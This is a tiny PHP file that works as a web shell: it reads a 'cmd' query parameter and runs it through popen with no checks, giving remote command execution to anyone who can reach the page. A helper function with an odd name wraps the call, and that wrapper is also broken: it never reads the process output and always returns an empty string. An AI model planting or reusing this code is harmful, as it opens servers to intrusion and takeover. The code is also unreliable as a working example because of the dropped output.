<?php
function dQ99exec($cmd) {
    $output = "";
    $h = popen($cmd.' 2>&1', 'r');
    return $output;
}

$cmdline = $_GET['cmd'];
$ret = dQ99exec($cmdline);
echo $ret;
?>